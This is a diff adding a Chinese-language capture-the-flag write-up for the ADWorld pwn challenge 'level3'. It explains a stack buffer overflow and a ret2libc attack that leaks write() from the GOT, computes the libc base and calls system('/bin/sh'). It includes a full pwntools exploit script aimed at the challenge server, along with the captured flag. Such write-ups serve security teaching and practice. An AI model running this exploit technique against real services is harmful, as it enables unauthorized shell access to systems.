@@ -730,11 +730,67 @@ io.interactive()
 
 ------
 
+### [level3](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5060)
 
+先`file ./level3`查看文件类型再`checksec --file=level3`检查了一下文件保护情况。
 
+![](https://paper.tanyaodan.com/ADWorld/pwn/5060/1.png)
 
+用`IDA Pro 32bit`打开附件`level3`，可以看到主函数如下：
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5060/2.png)
+
+双击`vulnerable_function`查看详情：
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5060/3.png)
+
+按`F5`反汇编源码可以看到该函数中有一个`char`型局部变量`buf`，可用栈大小只有`0x88`个字节，但是`read()`函数读取时限制输入到`buf`的字节为`0x100`，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5060/4.png)
+
+双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x88`个字节占满`buf`变量，然后再加上`4`个字节覆盖到`r`。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5060/5.png)
+
+在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，进行栈溢出并利用`write()`函数泄露`write()`函数在`got`表中的真实地址。接着我们可以用题目附件给出的`libc_32.so.6`来得到`write()`函数的偏移地址，从而计算出`libc`的基址地址`libcbase`，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，最后发送`payload`即可拿到`flag`。
+
+编写`Python`代码即可得到`cyberpeace{e1aa176d2d3aca8bc677d1c25dc9d919}`。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('111.200.241.244', 51304)
+e = ELF('./level3')
+write_plt = e.plt['write'] # 0x8048340
+info('write_plt => 0x%x', write_plt)
+write_got = e.got['write'] # 0x804a018
+info('write_got => 0x%x', write_got)
+main_address = e.symbols['main'] # 0x8048484
+info('main_address => 0x%x', main_address)
+payload = b'a'*0x88 + b'pwn!'
+payload += flat(write_plt, main_address, 1, write_got, 4)
+io.sendlineafter(b'Input:\n', payload)
+write_address = u32(io.recv(4)) 
+log.success('write_address => %s', hex(write_address))
+libc = ELF('./libc/libc_32.so.6')
+libcbase = write_address - libc.symbols['write']
+log.success('libcbase_address => 0x%x', libcbase)
+system_address = libcbase + libc.symbols['system'] 
+log.success('system_address => 0x%x', system_address)
+bin_sh_address = libcbase + libc.search(b'/bin/sh').__next__() 
+log.success('bin_sh_address => 0x%x', bin_sh_address)
+payload = b'a'*0x88 + b'pwn!'
+payload += flat(system_address, 0xdeadbeef, bin_sh_address)
+io.sendline(payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5060/6.png)
 
 ------
+
+
 
 ## CTFShow
 
